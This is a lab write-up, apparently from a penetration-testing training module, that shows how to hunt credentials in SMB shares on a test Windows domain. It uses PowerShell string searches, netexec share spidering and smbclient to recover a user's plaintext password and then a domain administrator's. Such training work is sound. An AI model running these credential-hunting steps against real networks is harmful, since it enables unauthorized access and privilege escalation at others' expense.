### Credential Hunting In Network Shares
 
IP: 10.129.234.173
 
---
 
### Question 1:
One of the shares mendres has access to contains valid credentials of another domain user. What is their password?
 
I start off by RDP'ing to the target.
 
```diff
+ $ xfreerdp /v:10.129.234.173 /u:mendres /p:Inlanefreight2025!
```
 
I then use a string search to find a file containing a string matching INLANEFREIGHT that may give a password.
 
```diff
+ PS> Get-ChildItem -Recurse -Include *.* \\DC01.inlanefreight.local\IT | Select-String -Pattern "INLANEFREIGHT\\"
```
 
	\\DC01.inlanefreight.local\IT\Tools\split_tunnel.txt:5:# Auth backup password: INLANEFREIGHT\jbader:ILovePower333###
 
&#x1F6A9; found **ILovePower333###**.
 
---
 
### Question 2:
As this user, search through the additional shares they have access to and identify the password of a domain administrator. What is it?
 
With this password, I now try to search in shares they have access to for any credentials for an administrator account.
 
```diff
+ $ netexec smb 10.129.234.173 -u jbader -p 'ILovePower333###' --spider HR --content --pattern "Administrator"
```
 
	SMB         10.129.234.173  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:inlanefreight.local) (signing:True) (SMBv1:None) (Null Auth:True)
	SMB         10.129.234.173  445    DC01             [+] inlanefreight.local\jbader:ILovePower333###
	SMB         10.129.234.173  445    DC01             [*] Spidering .
	SMB         10.129.234.173  445    DC01             //10.129.234.173/HR/Confidential/Onboarding_Docs_132.txt [lastm:'2025-05-01 13:33' size:1167 offset:1167 pattern:'passw']
	SMB         10.129.234.173  445    DC01             //10.129.234.173/HR/Public/Onboarding_Docs_485.docx [lastm:'2025-05-01 12:23' size:2091 offset:2091 pattern:'passw']
 
Seeing that there is a file of interest, I login to SMB with the credentials I found earlier and grab the file.
 
```diff
+ $ smbclient -U jbader //10.129.234.173/HR
+ smb: \> ls
```
 
	  .                                   D        0  Thu May  1 13:34:41 2025
	  ..                                  D        0  Thu May  1 13:34:41 2025
	  Confidential                        D        0  Thu May  1 12:23:18 2025
	  Public                              D        0  Thu May  1 12:23:19 2025
 
			5056511 blocks of size 4096. 1233693 blocks available
 
```diff
+ smb: \> cd Confidential
+ smb: \Confidential\> get Onboarding_Docs_132.txt
+ smb: \Confidential\> exit
+ $ cat Onboarding_Docs_132.txt
```
 
	getting file \Confidential\Onboarding_Docs_132.txt of size 1167 as Onboarding_Docs_132.txt (39.3 KiloBytes/sec) (average 39.3 KiloBytes/sec)
	<snip>
	**Username:** `Administrator`
	**Password:** `Str0ng_Adm1nistrat0r_P@ssword_2025!`
	<snip>
 
&#x1F6A9; found **Str0ng_Adm1nistrat0r_P@ssword_2025!**.
